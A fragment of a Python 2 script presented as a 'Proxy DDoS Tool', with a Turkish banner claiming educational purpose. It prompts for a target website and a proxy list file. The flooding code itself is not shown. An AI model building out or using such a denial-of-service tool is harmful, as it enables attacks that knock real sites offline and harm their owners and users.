...
#Main
print("      .----.  UN5T48L3 Proxy DDoS Tool  .----.      ")                           
print("»----(.:.Yazılımı çalıştırmak için bir proxy listesine ihtiyacınız var.:.)----»")
print(">-------------Sadece Eğitim Amaçlı Kodlanmıştır :)-------------<")
 
# Site
url = raw_input("Hedef (http://www.hedef.com): ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
 
#Proxy
in_file = open(raw_input("Proxy dosyasının dizini (/root/Desktop/proxy.txt): "),"r")
proxyf = in_file.read()
in_file.close()
